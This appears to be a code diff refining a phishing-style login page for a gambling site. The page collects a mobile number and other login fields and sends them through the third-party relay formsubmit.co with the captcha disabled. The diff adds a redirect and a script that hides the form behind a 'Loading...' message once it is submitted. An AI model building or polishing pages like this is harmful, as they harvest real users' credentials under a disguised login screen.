@@ -5,6 +5,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login Page</title>
   <link rel="stylesheet" href="sebono.css">
+  <style>
+    #loading-message {
+      display: none;
+      text-align: center;
+      font-size: 18px;
+      color: #333;
+    }
+  </style>
 </head>
 <body>
 
@@ -19,7 +27,17 @@
 
   <div class="container">
     <h2>Login</h2>
-    <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST"> <input type="hidden" name="_captcha" value="false">
+    <form 
+      id="login-form" 
+      action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" 
+      method="POST"
+    > 
+      <!-- Disable Captcha -->
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- Add Redirect -->
+      <input type="hidden" name="_redirect" value="https://yourwebsite.com/thank-you">
+
       <label for="mobile">Mobile Number</label>
       <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
 
@@ -30,6 +48,8 @@
 
       <button type="submit">Login</button>
     </form>
+
+    <div id="loading-message">Loading...</div>
 
     <div class="bottom">
       Don’t have an account yet? <a href="#">Sign Up</a>
@@ -45,5 +65,17 @@
     Gambling on this website, you run the risk that you may lose.
   </div>
 
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function (e) {
+      const loadingMessage = document.getElementById('loading-message');
+      const form = document.getElementById('login-form');
+
+      // Show loading message
+      loadingMessage.style.display = 'block';
+
+      // Hide the form
+      form.style.display = 'none';
+    });
+  </script>
 </body>
-</html>
+        </html>
